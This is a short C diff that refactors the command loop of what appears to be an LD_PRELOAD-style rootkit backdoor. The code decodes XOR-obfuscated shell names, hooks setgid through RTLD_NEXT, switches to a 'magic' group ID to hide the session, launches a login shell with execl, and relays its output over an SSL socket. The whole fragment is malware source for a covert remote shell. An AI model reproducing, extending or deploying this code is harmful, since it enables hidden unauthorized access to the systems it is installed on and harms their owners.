@@ -31,22 +31,19 @@ void cmd_loop(int sock)
         putenv(_env_var);
 
         snprintf(home_dir, sizeof(home_dir), "HOME=%s", install_dir);
-
         putenv(home_dir);
 
-        cleanup(env_var, strlen(env_var));
-        cleanup(install_dir, strlen(install_dir));
+        CLEAN(env_var);
+        CLEAN(install_dir);
 
         char *shell_name = strdup(SHELL_NAME); xor(shell_name);
-
         char *shell_type = strdup(SHELL_TYPE); xor(shell_type);
 
-        if(!old_setgid) get_symbol(RTLD_NEXT, CSETGID);
-
+        HOOK(old_setgid, CSETGID);
         old_setgid(MAGIC_GID);
         execl(shell_type, shell_name, "-l", (char *) 0);
-        cleanup(shell_name, strlen(shell_name));
-        cleanup(shell_type, strlen(shell_type));
+        CLEAN(shell_name);
+        CLEAN(shell_type);
         exit(1);
     }
 
@@ -104,10 +101,8 @@ void cmd_loop(int sock)
 
             if(n_r <= 0) break;
 
-            if(n_r <= 512)
-            {
-                SSL_write(ssl, buf, strlen(buf));
-            }else{
+            if(n_r <= 512) SSL_write(ssl, buf, strlen(buf));
+            else{
                 char temp[512], *tmp_str;
                 int cnt = 0;
 
